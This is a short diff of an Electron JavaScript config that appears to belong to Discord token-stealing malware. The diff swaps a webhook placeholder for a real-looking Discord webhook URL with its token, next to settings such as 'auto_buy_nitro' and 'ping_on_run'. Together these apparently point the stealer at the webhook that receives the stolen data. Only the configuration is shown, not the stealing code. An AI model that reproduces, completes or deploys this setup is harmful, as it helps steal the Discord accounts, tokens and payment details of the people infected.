@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK_LINK%',
+  webhook: 'https://discord.com/api/webhooks/990055113622171749/qAazNA9iR_QD11Xj9OSlcOzm7k1ydgfTxSGcxSu0Qhiz7Es8lM58qLdaHlnKiNKlxuAy',
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: true, 
   ping_on_run: true, 
